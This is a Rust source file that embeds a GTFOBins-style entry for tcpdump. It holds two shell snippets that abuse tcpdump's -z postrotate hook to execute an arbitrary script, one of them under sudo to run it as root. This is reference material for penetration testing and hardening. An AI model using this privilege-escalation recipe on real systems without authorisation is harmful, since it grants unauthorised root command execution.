pub static BIN_NAME: &'static str = "tcpdump";
pub static BIN_DESC: &'static str = "These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.

In recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the `postrotate-command` to a small subset of predefined commands thus preventing the execution of the following.";
pub static CMD_CODE: &'static str = r#"
    
    COMMAND='id'
    TF=$(mktemp)
    echo "$COMMAND" > $TF
    chmod +x $TF
    tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
"#;
pub static SUDO_CODE: &'static str = r#"
    
    COMMAND='id'
    TF=$(mktemp)
    echo "$COMMAND" > $TF
    chmod +x $TF
    sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
"#;
use crate::code::{Code, Tag};
pub static CMD: Code<'static> = Code { 
	title: "CMD_CODE",
	code: CMD_CODE,
	tag: Tag::CMD,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
